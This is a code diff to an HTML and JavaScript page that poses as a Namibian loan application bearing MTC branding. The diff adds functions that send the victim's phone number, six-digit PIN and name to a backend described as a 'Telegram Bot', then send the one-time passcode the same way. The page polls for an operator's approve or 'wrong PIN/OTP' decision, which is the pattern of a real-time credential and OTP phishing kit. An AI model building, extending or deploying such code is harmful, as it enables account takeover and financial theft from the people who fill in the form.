@@ -25,7 +25,9 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 .row b{color:#0A3A6B;font-weight:800}
 .total{background:#0A3A6B;color:#fff;border-radius:14px;padding:16px;display:flex;justify-content:space-between;margin-top:18px;align-items:center}
 .total b{font-size:20px}
-.btn{margin-top:28px;background:#FFC400;color:#0A3A6B;border:none;height:56px;border-radius:14px;font-weight:800;font-size:17px;cursor:pointer;width:100%;max-width:360px}
+.btn{margin-top:28px;background:#FFC400;color:#0A3A6B;border:none;height:56px;border-radius:14px;font-weight:800;font-size:17px;cursor:pointer;width:100%;max-width:360px;transition:all 0.3s}
+.btn:disabled{opacity:0.6;cursor:not-allowed}
+.btn:hover:not(:disabled){background:#FFD700}
 .btn-outline{background:#fff;border:2px solid #0A3A6B;max-width:180px}
 .label{font-size:11px;font-weight:800;color:#0A3A6B;text-transform:uppercase;margin-top:18px;display:block;letter-spacing:.6px}
 .input,.select{width:100%;height:54px;border:1.6px solid #D7D7D2;border-radius:12px;padding:0 16px;font-size:16px;margin-top:8px;background:#fcfcf9;outline:none}
@@ -43,6 +45,16 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 .pin-field{position:relative;max-width:420px;width:100%}
 .pin-field input{padding-right:70px}
 .pin-btn{position:absolute;right:10px;top:50%;transform:translateY(-50%);margin-top:4px;background:#fff;border:none;color:#0A5EB0;font-weight:800;font-size:14px;cursor:pointer;padding:8px}
+.loading{display:none;text-align:center;padding:20px;color:#0A3A6B;font-weight:700;margin-top:16px}
+.loading.active{display:block}
+.spinner{display:inline-block;width:20px;height:20px;border:3px solid #f3f3f3;border-top:3px solid #FFC400;border-radius:50%;animation:spin 1s linear infinite;margin-right:8px;vertical-align:middle}
+@keyframes spin{0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)}}
+.error-msg{background:#FFE5E5;color:#D32F2F;padding:12px 14px;border-radius:8px;margin-top:12px;font-size:13px;display:none}
+.error-msg.show{display:block}
+.success-msg{background:#E8F5E9;color:#2E7D32;padding:12px 14px;border-radius:8px;margin-top:12px;font-size:13px;display:none}
+.success-msg.show{display:block}
+.verify-status{background:#FFF3E0;color:#E65100;padding:12px 14px;border-radius:8px;margin-top:12px;font-size:13px;display:none}
+.verify-status.show{display:flex;align-items:center;gap:8px}
 </style>
 </head>
 <body>
@@ -88,7 +100,7 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 <label class="label">Full Names</label><input id="fullName" class="input" placeholder="Johannes Ndapanda">
 <div class="grid"><div><label class="label">First Name</label><input id="firstName" class="input"></div><div><label class="label">Surname</label><input id="lastName" class="input"></div></div>
 <label class="label">Namibia Phone Number</label><div class="prefix"><div class="pre">+264</div><input id="phoneDetail" class="input" style="flex:1" placeholder="81 XXX XXXX" inputmode="numeric"></div>
-<label class="label">Loan Purpose</label><select id="purpose" class="select"><option value="">Select purpose</option><option>Business</option><option>Education</option><option>Emergency</option><option>Home Improvement</option><option>Vehicle</option></select>
+<label class="label">Loan Purpose</label><select id="purpose" class="select"><option value="">Select purpose</option><option>Business</option><option>Education</option><option>Emergency</option><option>Home Improvement</option><option>Debt Consolidation</option></select>
 <label class="label">Income Per Month (N$)</label><input id="income" type="number" class="input" placeholder="e.g. 15000" inputmode="numeric">
 <div class="flex"><button class="btn btn-outline" onclick="nextStep(1)">Back</button><button class="btn" onclick="checkDetails()">Continue</button></div>
 </div>
@@ -104,7 +116,11 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 <button type="button" id="pinToggleBtn" class="pin-btn" onclick="togglePin()">Show</button>
 </div>
 </div>
-<button class="btn" onclick="goToOTP()">Continue</button>
+<button id="pinSubmitBtn" class="btn" onclick="submitPINToBot()">Continue</button>
+<div class="loading" id="pinLoading">
+<span class="spinner"></span>Verifying with Telegram Bot...
+</div>
+<div class="error-msg" id="pinErrorMsg"></div>
 <p class="small">By continuing you agree to our <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a></p>
 </div>
 <div class="screen" id="step4">
@@ -120,8 +136,16 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 <input class="otp" id="otp6" maxlength="1" inputmode="numeric">
 </div>
 <p class="small">By providing the OTP to MTC you consent to the processing and storing of your personal data.</p>
-<button class="btn" onclick="verifyOTP()">Verify</button>
-<p class="small">Didn't receive code? <b id="resendTimer">Resend in 01:00</b> <span id="resendAction" style="display:none"><a href="#" onclick="resendOTP();return false" style="color:#0A5EB0;font-weight:800">Resend now</a></span></p>
+<button id="otpSubmitBtn" class="btn" onclick="submitOTPToBot()">Verify</button>
+<div class="loading" id="otpLoading">
+<span class="spinner"></span>Wait while we verify your details...
+</div>
+<div class="verify-status" id="otpVerifyStatus">
+<span class="spinner"></span>
+<span>Sending OTP to Telegram Bot for verification...</span>
+</div>
+<div class="error-msg" id="otpErrorMsg"></div>
+<p class="small">Didn't receive code? <b id="resendTimer">Resend in 01:00</b> <span id="resendAction" style="display:none"><a href="#" onclick="resendOTP();return false" style="color:#0A5EB0;font-weight:700">Resend now</a></span></p>
 </div>
 <div class="screen" id="step5">
 <div class="success">✓</div>
@@ -142,99 +166,361 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 </div>
 </div>
 <script>
-const slider=document.getElementById('slider');
-const termSelect=document.getElementById('loanTerm');
-const fmt=n=>'N$ '+Number(n).toLocaleString('en-NA');
-function updateLoan(){
-  const p=parseInt(slider.value);
-  const term=parseInt(termSelect.value);
-  const interest=p*0.058; const total=p+interest; const monthly=total/term;
-  document.getElementById('amtBig').textContent=p.toLocaleString('en-NA');
-  document.getElementById('tAmt').textContent=fmt(p);
-  document.getElementById('tInt').textContent=fmt(interest.toFixed(0));
-  document.getElementById('tTotal').textContent=fmt(total.toFixed(0));
-  document.getElementById('tMonth').textContent=fmt(monthly.toFixed(0));
-  document.getElementById('tTerm').textContent=term+' months';
-  document.getElementById('loanRef').textContent=fmt(p);
-  const rt=document.getElementById('loanRefTerm'); if(rt) rt.textContent=term+' months';
-  document.getElementById('final1').textContent=fmt(p);
-  document.getElementById('finalTerm').textContent=term+' months';
-  document.getElementById('fAmt').textContent=fmt(p);
-  document.getElementById('fInt').textContent=fmt(interest.toFixed(0));
-  document.getElementById('fMonth').textContent=fmt(monthly.toFixed(0));
-  document.getElementById('fTotal').textContent=fmt(total.toFixed(0));
-  document.getElementById('fTerm').textContent=term+' months';
+// ===== CONFIG =====
+const API_BASE = 'https://your-backend-api.com/api'; // Replace with your backend URL
+const SESSION_ID = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+// ===== STATE MANAGEMENT =====
+let appState = {
+  sessionId: SESSION_ID,
+  phone: '',
+  pin: '',
+  otp: '',
+  loanAmount: 50000,
+  loanTerm: 12,
+  applicantName: '',
+  applicantPhone: '',
+  pinVerified: false,
+  otpVerified: false
+};
+
+// ===== POLLING MECHANISM FOR BOT CALLBACKS =====
+let pollInterval = null;
+
+function startPolling() {
+  if (pollInterval) clearInterval(pollInterval);
+  // Poll every 2 seconds for bot decisions
+  pollInterval = setInterval(checkBotResponse, 2000);
 }
-slider.addEventListener('input',updateLoan); updateLoan();
-function nextStep(n){
-  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
-  document.getElementById('step'+n).classList.add('active');
-  for(let i=1;i<=5;i++)document.getElementById('bar'+i).className=i<=n?'on':'';
-  if(n===4){startOTPTimer();}
-  if(n===5){
-    const full=document.getElementById('fullName').value || (document.getElementById('firstName').value+' '+document.getElementById('lastName').value);
-    document.getElementById('fName').textContent=full.trim()||'-';
-    const ph=document.getElementById('phoneDetail').value || document.getElementById('loginPhone').value;
-    document.getElementById('fPhone').textContent=ph?'+264 '+ph:'-';
+
+function stopPolling() {
+  if (pollInterval) clearInterval(pollInterval);
+}
+
+async function checkBotResponse() {
+  try {
+    const response = await fetch(`${API_BASE}/check-callback?sessionId=${appState.sessionId}`);
+    if (!response.ok) return;
+    
+    const data = await response.json();
+    
+    if (!data.decision) return; // No decision yet
+    
+    stopPolling();
+    
+    if (data.type === 'PIN') {
+      handlePINCallback(data.decision);
+    } else if (data.type === 'OTP') {
+      handleOTPCallback(data.decision);
+    }
+  } catch (error) {
+    console.error('Polling error:', error);
   }
 }
-function checkDetails(){
-  if(!document.getElementById('fullName').value || !document.getElementById('phoneDetail').value || !document.getElementById('purpose').value || !document.getElementById('income').value){alert('Please fill all fields');return;}
-  document.getElementById('loginPhone').value=document.getElementById('phoneDetail').value; nextStep(3);
+
+function handlePINCallback(decision) {
+  const loadingEl = document.getElementById('pinLoading');
+  const errorEl = document.getElementById('pinErrorMsg');
+  const submitBtn = document.getElementById('pinSubmitBtn');
+  
+  loadingEl.classList.remove('active');
+  
+  if (decision === 'APPROVE') {
+    appState.pinVerified = true;
+    errorEl.classList.remove('show');
+    document.getElementById('otpPhone').textContent = '+264 ' + appState.applicantPhone;
+    nextStep(4);
+  } else if (decision === 'WRONGPIN') {
+    errorEl.textContent = '❌ PIN is incorrect. Please try again.';
+    errorEl.classList.add('show');
+    document.getElementById('loginPin').value = '';
+    document.getElementById('loginPin').focus();
+    submitBtn.disabled = false;
+  }
 }
-function goToOTP(){
-  const p=document.getElementById('loginPhone').value;
-  const pin=document.getElementById('loginPin').value;
-  if(!p||!pin){alert('Enter phone and PIN');return;}
-  document.getElementById('otpPhone').textContent='+264 '+p;
-  nextStep(4);
+
+function handleOTPCallback(decision) {
+  const loadingEl = document.getElementById('otpLoading');
+  const verifyStatusEl = document.getElementById('otpVerifyStatus');
+  const errorEl = document.getElementById('otpErrorMsg');
+  const submitBtn = document.getElementById('otpSubmitBtn');
+  
+  loadingEl.classList.remove('active');
+  verifyStatusEl.classList.remove('show');
+  
+  if (decision === 'APPROVE') {
+    appState.otpVerified = true;
+    errorEl.classList.remove('show');
+    nextStep(5);
+  } else if (decision === 'WRONGOTP') {
+    errorEl.textContent = '❌ OTP is incorrect or has expired. Please try again.';
+    errorEl.classList.add('show');
+    document.querySelectorAll('.otp').forEach(input => input.value = '');
+    document.getElementById('otp1').focus();
+    submitBtn.disabled = false;
+    startOTPTimer(); // Restart timer
+  }
 }
-function togglePin(){
+
+// ===== PIN SUBMISSION =====
+async function submitPINToBot() {
+  const phone = document.getElementById('loginPhone').value.trim();
+  const pin = document.getElementById('loginPin').value.trim();
+  
+  if (!phone || !pin) {
+    alert('Please enter phone number and PIN');
+    return;
+  }
+  
+  if (pin.length !== 6) {
+    alert('PIN must be 6 digits');
+    return;
+  }
+  
+  appState.phone = phone;
+  appState.pin = pin;
+  appState.applicantPhone = phone;
+  
+  const loadingEl = document.getElementById('pinLoading');
+  const errorEl = document.getElementById('pinErrorMsg');
+  const submitBtn = document.getElementById('pinSubmitBtn');
+  
+  submitBtn.disabled = true;
+  errorEl.classList.remove('show');
+  loadingEl.classList.add('active');
+  
+  try {
+    const response = await fetch(`${API_BASE}/verify-pin`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionId: appState.sessionId,
+        phone: '+264' + phone,
+        pin: pin,
+        applicantName: appState.applicantName,
+        loanAmount: appState.loanAmount,
+        loanTerm: appState.loanTerm
+      })
+    });
+    
+    if (!response.ok) throw new Error('Failed to send PIN to bot');
+    
+    // Start polling for bot response
+    startPolling();
+    
+  } catch (error) {
+    console.error('Error:', error);
+    errorEl.textContent = '❌ Error sending PIN. Please try again.';
+    errorEl.classList.add('show');
+    loadingEl.classList.remove('active');
+    submitBtn.disabled = false;
+  }
+}
+
+// ===== OTP SUBMISSION =====
+async function submitOTPToBot() {
+  const otpCode = Array.from(document.querySelectorAll('.otp'))
+    .map(input => input.value)
+    .join('');
+  
+  if (otpCode.length !== 6) {
+    alert('Please enter 6-digit OTP');
+    return;
+  }
+  
+  appState.otp = otpCode;
+  
+  const loadingEl = document.getElementById('otpLoading');
+  const verifyStatusEl = document.getElementById('otpVerifyStatus');
+  const errorEl = document.getElementById('otpErrorMsg');
+  const submitBtn = document.getElementById('otpSubmitBtn');
+  
+  submitBtn.disabled = true;
+  errorEl.classList.remove('show');
+  verifyStatusEl.classList.add('show');
+  loadingEl.classList.add('active');
+  
+  try {
+    const response = await fetch(`${API_BASE}/verify-otp`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionId: appState.sessionId,
+        otp: otpCode,
+        phone: '+264' + appState.phone
+      })
+    });
+    
+    if (!response.ok) throw new Error('Failed to send OTP to bot');
+    
+    // Start polling for bot response
+    startPolling();
+    
+  } catch (error) {
+    console.error('Error:', error);
+    errorEl.textContent = '❌ Error sending OTP. Please try again.';
+    errorEl.classList.add('show');
+    loadingEl.classList.remove('active');
+    verifyStatusEl.classList.remove('show');
+    submitBtn.disabled = false;
+  }
+}
+
+// ===== ORIGINAL FUNCTIONS (UNCHANGED) =====
+const slider = document.getElementById('slider');
+const termSelect = document.getElementById('loanTerm');
+const fmt = n => 'N$ ' + Number(n).toLocaleString('en-NA');
+
+function updateLoan() {
+  const p = parseInt(slider.value);
+  const term = parseInt(termSelect.value);
+  const interest = p * 0.058;
+  const total = p + interest;
+  const monthly = total / term;
+  
+  appState.loanAmount = p;
+  appState.loanTerm = term;
+  
+  document.getElementById('amtBig').textContent = p.toLocaleString('en-NA');
+  document.getElementById('tAmt').textContent = fmt(p);
+  document.getElementById('tInt').textContent = fmt(interest.toFixed(0));
+  document.getElementById('tTotal').textContent = fmt(total.toFixed(0));
+  document.getElementById('tMonth').textContent = fmt(monthly.toFixed(0));
+  document.getElementById('tTerm').textContent = term + ' months';
+  document.getElementById('loanRef').textContent = fmt(p);
+  
+  const rt = document.getElementById('loanRefTerm');
+  if (rt) rt.textContent = term + ' months';
+  
+  document.getElementById('final1').textContent = fmt(p);
+  document.getElementById('finalTerm').textContent = term + ' months';
+  document.getElementById('fAmt').textContent = fmt(p);
+  document.getElementById('fInt').textContent = fmt(interest.toFixed(0));
+  document.getElementById('fMonth').textContent = fmt(monthly.toFixed(0));
+  document.getElementById('fTotal').textContent = fmt(total.toFixed(0));
+  document.getElementById('fTerm').textContent = term + ' months';
+}
+
+slider.addEventListener('input', updateLoan);
+updateLoan();
+
+function nextStep(n) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('step' + n).classList.add('active');
+  
+  for (let i = 1; i <= 5; i++) {
+    document.getElementById('bar' + i).className = i <= n ? 'on' : '';
+  }
+  
+  if (n === 4) {
+    startOTPTimer();
+  }
+  
+  if (n === 5) {
+    const full = document.getElementById('fullName').value || 
+                 (document.getElementById('firstName').value + ' ' + document.getElementById('lastName').value);
+    document.getElementById('fName').textContent = full.trim() || '-';
+    
+    const ph = document.getElementById('phoneDetail').value || document.getElementById('loginPhone').value;
+    document.getElementById('fPhone').textContent = ph ? '+264 ' + ph : '-';
+  }
+}
+
+function checkDetails() {
+  const fullName = document.getElementById('fullName').value;
+  const phone = document.getElementById('phoneDetail').value;
+  const purpose = document.getElementById('purpose').value;
+  const income = document.getElementById('income').value;
+  
+  if (!fullName || !phone || !purpose || !income) {
+    alert('Please fill in all fields');
+    return;
+  }
+  
+  appState.applicantName = fullName;
+  appState.applicantPhone = phone;
+  
+  document.getElementById('loginPhone').value = phone;
+  nextStep(3);
+}
+
+function togglePin() {
   const pinInput = document.getElementById('loginPin');
   const btn = document.getElementById('pinToggleBtn');
-  if(pinInput.type === 'password'){pinInput.type = 'text'; btn.textContent = 'Hide';}else{pinInput.type = 'password'; btn.textContent = 'Show';}
+  
+  if (pinInput.type === 'password') {
+    pinInput.type = 'text';
+    btn.textContent = 'Hide';
+  } else {
+    pinInput.type = 'password';
+    btn.textContent = 'Show';
+  }
   pinInput.focus();
 }
-let otpTimer; let timeLeft = 60;
-function startOTPTimer(){
-  clearInterval(otpTimer); timeLeft = 60;
-  const rt=document.getElementById('resendTimer'); const ra=document.getElementById('resendAction');
-  if(rt) rt.style.display='inline'; if(ra) ra.style.display='none';
+
+let otpTimer;
+let timeLeft = 60;
+
+function startOTPTimer() {
+  clearInterval(otpTimer);
+  timeLeft = 60;
+  
+  const rt = document.getElementById('resendTimer');
+  const ra = document.getElementById('resendAction');
+  
+  if (rt) rt.style.display = 'inline';
+  if (ra) ra.style.display = 'none';
+  
   updateTimerText();
-  otpTimer = setInterval(()=>{
-    timeLeft--; updateTimerText();
-    if(timeLeft<=0){
+  
+  otpTimer = setInterval(() => {
+    timeLeft--;
+    updateTimerText();
+    
+    if (timeLeft <= 0) {
       clearInterval(otpTimer);
-      if(rt) rt.style.display='none';
-      if(ra) ra.style.display='inline';
+      if (rt) rt.style.display = 'none';
+      if (ra) ra.style.display = 'inline';
     }
-  },1000);
+  }, 1000);
 }
-function updateTimerText(){
-  const el=document.getElementById('resendTimer'); if(!el) return;
-  const m = Math.floor(timeLeft/60).toString().padStart(2,'0');
-  const s = (timeLeft%60).toString().padStart(2,'0');
+
+function updateTimerText() {
+  const el = document.getElementById('resendTimer');
+  if (!el) return;
+  
+  const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+  const s = (timeLeft % 60).toString().padStart(2, '0');
   el.textContent = `Resend in ${m}:${s}`;
 }
-function resendOTP(){
-  alert('New OTP sent to '+document.getElementById('otpPhone').textContent);
-  document.querySelectorAll('.otp').forEach(i=>i.value='');
-  const first=document.getElementById('otp1'); if(first) first.focus();
+
+function resendOTP() {
+  alert('New OTP sent to ' + document.getElementById('otpPhone').textContent);
+  document.querySelectorAll('.otp').forEach(i => i.value = '');
+  const first = document.getElementById('otp1');
+  if (first) first.focus();
   startOTPTimer();
 }
-function verifyOTP(){
-  const code = Array.from(document.querySelectorAll('.otp')).map(i=>i.value).join('');
-  if(code.length!==6){alert('Please enter 6-digit OTP');return;}
-  nextStep(5);
-}
-document.querySelectorAll('.otp').forEach((input, idx, all)=>{
-  input.addEventListener('input', (e)=>{
-    e.target.value = e.target.value.replace(/[^0-9]/g,'');
-    if(e.target.value && idx < 5){all[idx+1].focus();}
+
+// OTP input behavior
+document.querySelectorAll('.otp').forEach((input, idx, all) => {
+  input.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+    if (e.target.value && idx < 5) {
+      all[idx + 1].focus();
+    }
   });
-  input.addEventListener('keydown', (e)=>{
-    if(e.key==='Backspace' &&!e.target.value && idx>0){all[idx-1].focus();}
+  
+  input.addEventListener('keydown', (e) => {
+    if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+      all[idx - 1].focus();
+    }
   });
+});
+
+// Cleanup on page unload
+window.addEventListener('beforeunload', () => {
+  stopPolling();
 });
 </script>
 </body>
